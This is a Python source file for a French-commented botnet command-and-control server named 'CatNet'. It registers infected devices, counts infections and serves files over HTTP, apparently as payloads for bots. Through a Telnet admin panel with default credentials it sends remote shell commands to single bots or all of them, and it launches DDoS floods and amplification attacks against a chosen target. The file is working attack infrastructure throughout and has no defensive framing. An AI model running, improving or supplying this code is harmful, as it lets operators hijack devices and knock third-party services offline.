#!/usr/bin/env python3
import socket
import threading
import time
import sys
import os
import http.server
import socketserver
import random
import string
from datetime import datetime

import gc

# Configuration ultra-légère pour Raspberry Pi (WiFi)
HOST = '0.0.0.0'
PORT = 1337
HTTP_PORT = 80
ADMIN_PORT = 2323
MAX_CONNECTIONS = 200 # Réduit encore pour éviter la saturation WiFi
LOG_TO_FILE = False
BINARIES_DIR = os.path.dirname(os.path.abspath(__file__))

# Couleurs ANSI pour l'interface
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    CLEAR = '\033[2J\033[H'

DDOS_METHODS = {
    "syn": "Flood SYN", "ack": "Flood ACK", "udp": "Flood UDP",
    "tcp": "Flood TCP", "icmp": "Flood ICMP", "http": "Flood HTTP",
    "slowloris": "Slowloris", "rudy": "RUDY", "arme": "ARME",
    "hulk": "HULK", "mix": "Mix", "bypass": "Bypass",
    "dns": "DNS Amplification", "vse": "Valve Source Engine",
    "ntp": "NTP Reflection", "ssdp": "SSDP Amplification",
    "ovh": "OVH Bypass", "std": "STD UDP Flood"
}

class BotnetC2:
    def __init__(self):
        self.connected_bots = []
        self.lock = threading.Lock()
        self.total_infections = 0
        self.total_commands = 0
        self.active_ddos = 0
        self.running = True
        self.show_scans = False # Basculer l'affichage des scans
        self.admin_sockets = [] # Liste des administrateurs connectés

    def log(self, message, level="INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")

    def broadcast_to_admins(self, message):
        """Envoie un message à tous les administrateurs connectés via PuTTY."""
        with self.lock:
            for sock in self.admin_sockets[:]:
                try:
                    sock.send(message.replace("\n", "\r\n").encode())
                except:
                    self.admin_sockets.remove(sock)

    def handle_bot(self, client_socket, address):
        bot_info = {
            'ip': address[0], 'port': address[1],
            'connected_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'socket': client_socket, 'arch': 'unknown',
            'hostname': 'unknown', 'system_info': '', 'tasks': [],
            'device_id': 'unknown', 'status': 'connected'
        }
        
        try:
            # Timeout plus court pour libérer les ressources plus vite
            client_socket.settimeout(30)
            data = client_socket.recv(1024).decode('utf-8', errors='ignore')
            
            if data and 'BOT_CONNECTED' in data:
                with self.lock:
                    self.total_infections += 1
                
                parts = data.split('|')
                if len(parts) >= 3:
                    bot_info['device_id'] = parts[1].strip()
                    bot_info['system_info'] = parts[2].strip()
                    if 'Hostname:' in bot_info['system_info']:
                        bot_info['hostname'] = bot_info['system_info'].split('\n')[0].split('Hostname:')[1].strip()
                    
                    for arch in ['mips', 'arm', 'x86_64', 'x86']:
                        if arch in bot_info['system_info'].lower():
                            bot_info['arch'] = arch
                            break
                
                with self.lock:
                    # Nettoyage agressif de la RAM (Garbage Collector) pour la Pi
                    if len(self.connected_bots) % 100 == 0:
                        gc.collect()
                        
                    if len(self.connected_bots) < MAX_CONNECTIONS:
                        self.connected_bots.append(bot_info)
                    else:
                        client_socket.close()
                        return

                # Réduire le verbiage des logs, mais notifier les admins si nécessaire
                # self.log(f"Nouveau bot: {address[0]} (ID: {bot_info['device_id']})")
                client_socket.send("PING".encode('utf-8'))

            while self.running:
                try:
                    # Timeout très long (5 min) pour minimiser les échanges keep-alive
                    client_socket.settimeout(300)
                    data = client_socket.recv(1024).decode('utf-8', errors='ignore')
                    if not data: break
                    
                    if data.startswith("SCAN_RESULT|"):
                        # Afficher les scans en temps réel si l'option est activée
                        if self.show_scans:
                            msg = f"{Colors.YELLOW}[SCAN] {address[0]} -> {data.split('|')[1]}{Colors.END}\n"
                            self.broadcast_to_admins(msg)
                    elif data.startswith("DDOS_STARTED|"):
                        with self.lock: self.active_ddos += 1
                        if self.show_scans:
                            msg = f"{Colors.GREEN}[DDOS] {address[0]} a commencé l'attaque sur {data.split('|')[1]}{Colors.END}\n"
                            self.broadcast_to_admins(msg)
                    elif data.startswith("VERIFY_INFECTION|"):
                        if self.show_scans:
                            msg = f"{Colors.CYAN}[INFECTION] {address[0]} confirmée!{Colors.END}\n"
                            self.broadcast_to_admins(msg)
                    elif data == "PONG":
                        pass
                except socket.timeout:
                    try:
                        client_socket.send("PING".encode('utf-8'))
                    except: break
                except Exception:
                    break
        finally:
            with self.lock:
                if bot_info in self.connected_bots:
                    self.connected_bots.remove(bot_info)
            client_socket.close()
            self.log(f"Bot déconnecté: {address[0]}")

    def broadcast(self, command):
        count = 0
        with self.lock:
            for bot in self.connected_bots:
                try:
                    bot['socket'].send(command.encode('utf-8'))
                    bot['tasks'].append(command)
                    count += 1
                except: pass
        self.total_commands += count
        return count

    def command_interface(self):
        while self.running:
            try:
                cmd = input(f"\n[Bots: {len(self.connected_bots)}] > ").strip().split()
                if not cmd: continue
                self.process_command(cmd, sys.stdout)
            except EOFError:
                break

    def get_banner(self):
        banner = f"""{Colors.CYAN}
   ▄████████    ▄████████     ███        ▄██████▄   ▄██████▄  
  ███    ███   ███    ███ ▀█████████▄   ███    ███ ███    ███ 
  ███    █▀    ███    ███    ▀███▀▀██   ███    ███ ███    ███ 
  ███          ███    ███     ███   ▀   ███    ███ ███    ███ 
  ███        ▀███████████     ███       ███    ███ ███    ███ 
  ███    █▄    ███    ███     ███       ███    ███ ███    ███ 
  ███    ███   ███    ███     ███       ███    ███ ███    ███ 
  ▀████████    ███    █▀     ▄████▀      ▀██████▀   ▀██████▀  
{Colors.MAGENTA}          >> CATNET BOTNET C2 INTERFACE v3.2 <<{Colors.END}
{Colors.WHITE}   [+] Admin Panel : Connected | WiFi-Optimized : YES{Colors.END}
        """
        return banner

    def process_command(self, cmd, out):
        action = cmd[0].lower()
        if action == "list":
            with self.lock:
                if not self.connected_bots:
                    out.write(f"{Colors.RED}[!] Aucun bot connecté.{Colors.END}\n")
                    return
                out.write(f"\r\n{Colors.BOLD}{'ID':<5} | {'IP':<15} | {'Hostname':<20} | {'Arch':<10}{Colors.END}\n")
                out.write(f"{Colors.BLUE}" + "-" * 60 + f"{Colors.END}\n")
                for i, b in enumerate(self.connected_bots):
                    out.write(f"{i:<5} | {b['ip']:<15} | {b['hostname']:<20} | {b['arch']:<10}\n")
        
        elif action == "shell" and len(cmd) > 2:
            # shell <id> <command>
            try:
                bot_id = int(cmd[1])
                command = " ".join(cmd[2:])
                with self.lock:
                    if bot_id < len(self.connected_bots):
                        bot = self.connected_bots[bot_id]
                        bot['socket'].send(f"EXEC {command}".encode())
                        out.write(f"{Colors.GREEN}[+] Commande envoyée au bot {bot_id}.{Colors.END}\n")
                    else:
                        out.write(f"{Colors.RED}[!] ID de bot invalide.{Colors.END}\n")
            except:
                out.write(f"{Colors.RED}[!] Usage: shell <id> <command>{Colors.END}\n")

        elif action == "broadcast" and len(cmd) > 1:
            n = self.broadcast("EXEC " + " ".join(cmd[1:]))
            out.write(f"{Colors.GREEN}[+] Commande envoyée à {n} bots.{Colors.END}\n")
            
        elif action == "ddos-all" and len(cmd) > 2:
            target = cmd[1]
            duration = cmd[2]
            method = cmd[3].lower() if len(cmd) > 3 else 'mix'
            port = cmd[4] if len(cmd) > 4 else '80'
            
            if method not in DDOS_METHODS and method != "mix":
                out.write(f"{Colors.RED}[!] Méthode inconnue. Tapez 'methods' pour la liste.{Colors.END}\n")
                return

            # Petite animation de lancement
            out.write(f"{Colors.YELLOW}[*] Préparation de l'attaque {method} sur {target}...")
            if hasattr(out, 'flush'): out.flush()
            time.sleep(0.5)
            out.write(f"\r{Colors.GREEN}[+] Attaque {method} lancée sur {target}:{port} ({duration}s){Colors.END}\n")
            
            n = self.broadcast(f"DDOS {target} {port} {duration} {method}")
            out.write(f"{Colors.CYAN}[*] {n} bots ont reçu l'ordre d'attaque.{Colors.END}\n")
            
        elif action == "methods":
            out.write(f"\r\n{Colors.BOLD}Méthodes DDoS disponibles :{Colors.END}\n")
            for m, desc in DDOS_METHODS.items():
                out.write(f" - {Colors.YELLOW}{m:<10}{Colors.END} : {desc}\n")
        elif action == "scans":
            self.show_scans = not self.show_scans
            status = f"{Colors.GREEN}ACTIVÉ{Colors.END}" if self.show_scans else f"{Colors.RED}DÉSACTIVÉ{Colors.END}"
            out.write(f"[*] Affichage des scans en temps réel : {status}\n")
        elif action == "status":
            with self.lock:
                out.write(f"\r\n{Colors.BOLD}Statistiques CatNet :{Colors.END}\n")
                out.write(f" - Bots en ligne    : {Colors.GREEN}{len(self.connected_bots)}{Colors.END}\n")
                out.write(f" - Total infections : {Colors.CYAN}{self.total_infections}{Colors.END}\n")
                out.write(f" - Attaques actives : {Colors.RED}{self.active_ddos}{Colors.END}\n")
        elif action == "help":
            out.write(f"\r\n{Colors.BOLD}Commandes disponibles :{Colors.END}\n")
            out.write(f" - {Colors.YELLOW}list{Colors.END}             : Affiche les bots connectés\n")
            out.write(f" - {Colors.YELLOW}shell <id> <cmd>{Colors.END} : Exécute une commande sur un bot spécifique\n")
            out.write(f" - {Colors.YELLOW}broadcast <cmd>{Colors.END}  : Exécute une commande sur TOUS les bots\n")
            out.write(f" - {Colors.YELLOW}ddos-all <t> <d> <m>{Colors.END}: Lance une attaque DDoS générale\n")
            out.write(f" - {Colors.YELLOW}methods{Colors.END}          : Liste les types d'attaques\n")
            out.write(f" - {Colors.YELLOW}scans{Colors.END}            : Active/Désactive le monitoring des scans\n")
            out.write(f" - {Colors.YELLOW}status{Colors.END}           : Affiche les stats globales\n")
            out.write(f" - {Colors.YELLOW}clear{Colors.END}            : Efface l'écran\n")
            out.write(f" - {Colors.YELLOW}logout/exit{Colors.END}      : Quitter l'interface\n")
        elif action == "clear":
            out.write(Colors.CLEAR)
            out.write(self.get_banner())
        elif action == "exit":
            self.running = False
            sys.exit(0)

    def read_line(self, sock, echo=True):
        """Lit une ligne depuis le socket Telnet en gérant l'écho et les retours arrière."""
        line = b""
        while True:
            try:
                char = sock.recv(1)
                if not char: return None
                
                # Gérer les commandes Telnet (IAC)
                if char == b"\xff": # IAC
                    cmd = sock.recv(1)
                    if cmd in [b"\xfb", b"\xfc", b"\xfd", b"\xfe"]: # WILL, WON'T, DO, DON'T
                        sock.recv(1) # Ignorer l'option
                    continue
                
                # Gérer la touche Entrée
                if char == b"\n": 
                    sock.send(b"\r\n")
                    break
                if char == b"\r": 
                    # Regarder si le prochain est \n ou \0
                    sock.setblocking(False)
                    try:
                        next_char = sock.recv(1)
                        if next_char != b"\n" and next_char != b"\0":
                            line += next_char
                            if echo: sock.send(next_char)
                    except: pass
                    sock.setblocking(True)
                    sock.send(b"\r\n")
                    break
                
                # Gérer la touche Retour arrière (Backspace)
                if char in [b"\x08", b"\x7f"]: # BS ou DEL
                    if len(line) > 0:
                        line = line[:-1]
                        if echo: sock.send(b"\x08 \x08") # Reculer, effacer, reculer
                    continue
                
                # Ajouter le caractère et l'afficher (écho)
                line += char
                if echo: sock.send(char)
                
            except: return None
        
        # Décoder et nettoyer agressivement
        result = line.decode('utf-8', errors='ignore').strip()
        return "".join(c for c in result if c.isprintable())

    def handle_admin(self, admin_socket, address):
        try:
            # Forcer le mode caractère et désactiver l'écho local du client
            admin_socket.send(bytes([255, 251, 1, 255, 251, 3]))
            
            admin_socket.send(Colors.CLEAR.encode())
            admin_socket.send(self.get_banner().replace("\n", "\r\n").encode())
            
            admin_socket.send(b"\r\nCatNet Admin Login: ")
            login = self.read_line(admin_socket, echo=True)
            if login is None: return
            
            admin_socket.send(b"Password: ")
            password = self.read_line(admin_socket, echo=False)
            if password is None: return
            
            if login.lower() == "admin" and password == "admin":
                with self.lock:
                    self.admin_sockets.append(admin_socket)
                
                admin_socket.send(f"\r\n{Colors.GREEN}[+] Accès autorisé.{Colors.END}\r\n".encode())
                admin_socket.send(b"Tapez 'help' for commands.\r\n")
                
                while self.running:
                    prompt = f"\r\n{Colors.BOLD}[{Colors.CYAN}CatNet{Colors.WHITE}@{Colors.MAGENTA}{len(self.connected_bots)}{Colors.END}{Colors.BOLD}]{Colors.END} > "
                    admin_socket.send(prompt.encode())
                    data = self.read_line(admin_socket, echo=True)
                    if not data: break
                    if data.lower() == "logout": break
                    
                    cmd = data.split()
                    if not cmd: continue
                    
                    import io
                    output = io.StringIO()
                    self.process_command(cmd, output)
                    admin_socket.send(output.getvalue().replace("\n", "\r\n").encode())
            else:
                admin_socket.send(f"\r\n{Colors.RED}[!] Échec de l'authentification.{Colors.END}\r\n".encode())
        except Exception as e:
            pass
        finally:
            with self.lock:
                if admin_socket in self.admin_sockets:
                    self.admin_sockets.remove(admin_socket)
            admin_socket.close()

    def admin_listener(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((HOST, ADMIN_PORT))
            server.listen(5)
            self.log(f"Admin C2 démarré sur {ADMIN_PORT} (PuTTY)")
            while self.running:
                client, addr = server.accept()
                threading.Thread(target=self.handle_admin, args=(client, addr), daemon=True).start()
        except Exception as e:
            self.log(f"Erreur Admin C2: {e}", "ERROR")
        finally:
            server.close()

    def run_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((HOST, PORT))
            server.listen(MAX_CONNECTIONS)
            self.log(f"C2 démarré sur {PORT}")
            while self.running:
                client, addr = server.accept()
                threading.Thread(target=self.handle_bot, args=(client, addr), daemon=True).start()
        except Exception as e:
            self.log(f"Erreur serveur: {e}", "ERROR")
        finally:
            server.close()

def start_http():
    class Handler(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args): pass
    try:
        httpd = socketserver.ThreadingTCPServer((HOST, HTTP_PORT), Handler)
        httpd.serve_forever()
    except: pass

if __name__ == "__main__":
    c2 = BotnetC2()
    threading.Thread(target=start_http, daemon=True).start()
    threading.Thread(target=c2.run_server, daemon=True).start()
    threading.Thread(target=c2.admin_listener, daemon=True).start()
    c2.command_interface()
